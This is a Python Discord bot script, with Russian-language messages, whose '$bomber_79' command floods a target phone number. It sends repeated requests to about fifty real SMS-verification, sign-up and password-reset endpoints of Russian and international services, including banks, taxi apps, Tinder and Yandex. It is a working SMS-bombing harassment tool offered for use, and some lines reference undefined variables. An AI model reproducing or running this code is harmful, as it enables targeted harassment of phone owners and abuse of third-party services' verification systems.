import discord
from discord.ext import commands
import requests
import random
import os

bot = discord.Client()

@bot.event
async def on_message(message):
	
	if message.content.startswith('https://discord.gg'):
		await message.delete()
			
	if message.content.startswith('$help'):
		channel = message.channel
		await channel.send('Читайте закрепленное сообщение')
	
	if message.content.startswith('$bomber_79'):
		channel = message.channel
		phone = message.content[8:19]
		global iteration
		iteration = int(message.content[20:])
		await channel.send('Начинаем атаку')
		_name = ''
		_email = _name+f'{iteration}'+'@gmail.com'
		email = _name+f'{iteration}'+'@gmail.com'
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		phone9 = phone[1:]
		i = 0

		while i < iteration:
			try:
				requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
				await channel.send('[+] Grab отправлено!')
			except:
				await channel.send('[-] Не отправлено!')
			try:
				requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]
				await channel.send('[+] RuTaxi отправлено!')
			except:
				await channel.send('[-] Не отправлено!')
			try:
				requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
				await channel.send('[+] BelkaCar отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
				await channel.send('[+] Tinder отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
				await channel.send('[+] Karusel отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
				await channel.send('[+] Tinkoff отправлено!')
			except:
				await channel.send('[-] Не отправлено!')
			try:
				requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
				await channel.send('[+] MTS отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
				await channel.send('[+] Youla отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})
				await channel.send('[+] PizzaHut отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://www.rabota.ru/remind', data={'credential': phone})
				await channel.send('[+] Rabota отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
				await channel.send('[+] Rutube отправлено!')
			except:
				requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')
				await channel.send('[+] Citilink отправлено!')

			try:
				requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': phone, 'promo': 'yellowforma'})
				await channel.send('[+] Smsint отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en')
				await channel.send('[+] oyorooms отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
				await channel.send('[+] MVideo отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
				await channel.send('[+] newnext отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
				await channel.send('[+] Sunlight отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobilephone': phone, 'deliveryOption': 'sms'})
				await channel.send('[+] alpari отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
				await channel.send('[+] Invitro отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
				await channel.send('[+] Sberbank отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
				await channel.send('[+] Psbank отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
				await channel.send('[+] Beltelcom отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
				await channel.send('[+] Karusel отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
				await channel.send('[+] KFC отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
				await channel.send('[+] carsmile отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
				await channel.send('[+] Citilink отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
				await channel.send('[+] Delitime отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
				await channel.send('[+] findclone звонок отправлен!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone}})
				await channel.send('[+] Guru отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
				await channel.send('[+] ICQ отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
				await channel.send('[+] InDriver отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
				await channel.send('[+] Invitro отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": phone})
				await channel.send('[+] Pmsm отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone})
				await channel.send('[+] IVI отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formattedphone})
				await channel.send('[+] Lenta отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
				await channel.send('[+] Mail.ru отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""})
				await channel.send('[+] MVideo отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone})
				await channel.send('[+] OK отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://plink.tech/register/',json={"phone": phone})
				await channel.send('[+] Plink отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
				await channel.send('[+] qlean отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("http://smsgorod.ru/sendsms.php",data={"number": phone})
				await channel.send('[+] SMSgorod отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})
				await channel.send('[+] Tinder отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": username})
				await channel.send('[+] Twitch отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'})
				await channel.send('[+] CabWiFi отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2})
				await channel.send('[+] wowworks отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone})
				await channel.send('[+] Eda.Yandex отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
				await channel.send('[+] Youla отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobilephone": phone, "deliveryOption": "sms"})
				await channel.send('[+] Alpari отправлено!')
			except:
				await channel.send('[-] Не отправлено!')

			try:
				requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
				await channel.send('[+] SMS отправлено!')
			except:
				await channel.send('[-] не отправлено!')

			try:
				requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
				await channel.send('[+] Delivery отправлено!')
			except:
				await channel.send('[-] Не отправлено!')
			try:
				i += 1
				await channel.send(('{} круг пройден.').format(i))
			except:
				await channel.send('я обосрался')

	if message.content.startswith('$stop'):
		channel = message.channel
		await channel.send('Выполнение закончится на этом круге')
		iteration = 0
		
token = os.environ.get('TOKEN')
bot.run(token)
